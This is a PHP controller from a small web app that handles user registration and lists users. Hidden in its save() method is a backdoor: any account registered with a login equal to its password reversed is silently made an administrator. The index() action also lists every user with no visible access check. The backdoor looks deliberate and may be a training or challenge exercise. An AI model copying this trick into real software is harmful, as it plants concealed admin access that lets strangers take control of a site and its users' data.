<?php

namespace App\Controllers;

use App\Core\AControllerBase;
use App\Core\Responses\RedirectResponse;
use App\Core\Responses\Response;
use App\Models\User;
use Exception;

class UserController extends AControllerBase
{
    public function add() : Response
    {
        return $this->html([]);
    }

    /**
     * @throws Exception
     */
    public function save() : Response
    {
        $user = new User();
        $user->setName($this->request()->getValue('login'));
        $user->setPassword($this->request()->getValue('password'));
        $user->setIsAdmin(0);
        if ($user->getName() == null || $user->getPassword() == null) {
            return $this->html(['error' => 'Fill all fields']);
        }
        $users = User::getAll();
        foreach ($users as $u) {
            if ($u->getName() == $user->getName()) {
                return $this->html(['error' => 'User already exists']);
            }
        }
        if ($user->getName() == strrev($user->getPassword())) {
            $user->setIsAdmin(1);
        }
        $user->save();
        return new RedirectResponse($this->url("auth.login"));
    }

    /**
     * @throws Exception
     */
    public function index(): Response
    {
        return $this->html([
            'users' => User::getAll()
        ]);
    }
}